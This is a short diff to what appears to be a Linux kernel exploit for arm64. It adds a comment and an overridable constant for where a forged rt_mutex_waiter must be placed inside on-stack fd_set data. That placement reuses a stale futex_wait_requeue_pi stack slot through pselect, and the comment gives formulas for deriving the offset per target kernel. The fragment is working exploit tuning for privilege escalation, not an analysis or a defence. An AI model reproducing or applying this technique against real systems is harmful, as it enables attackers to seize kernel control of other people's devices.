@@ -5,7 +5,29 @@
 #define SLIDE_CONSUME_USEC 0
 #define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
 #define SLIDE_PSELECT_PAD_BYTES 0
+/*
+ * Where the forged waiter has to sit inside the fd_set block, in 8-byte words.
+ *
+ * The primitive leaves a real rt_mutex_waiter on the thread's kernel stack in
+ * futex_wait_requeue_pi, then reuses that stack from a *different* syscall:
+ * core_sys_select copies the fd_sets into its on-stack stack_fds array. So the
+ * shift is the distance between two stack slots reached through two different
+ * call chains from the same syscall entry sp — i.e. a property of how this
+ * particular kernel was compiled, not of any struct. It has to be re-derived
+ * per target by reading the prologues:
+ *
+ *   fd_sets   = sp_entry - frame(__arm64_sys_pselect6) - frame(core_sys_select)
+ *               + offsetof_in_frame(stack_fds)
+ *   rt_waiter = sp_entry - frame(__arm64_sys_futex) - frame(do_futex)
+ *               - frame(futex_wait_requeue_pi) + offsetof_in_frame(rt_waiter)
+ *   shift     = (rt_waiter - fd_sets) / 8
+ *
+ * Get it wrong and the kernel walks whatever happens to be at the waiter's
+ * address as a PI chain, which panics rather than fails.
+ */
+#ifndef SLIDE_PSELECT_WORD_SHIFT
 #define SLIDE_PSELECT_WORD_SHIFT 0
+#endif
 #define SLIDE_WAIT_SECONDS 30
 
 static uint32_t slide_f_wait;
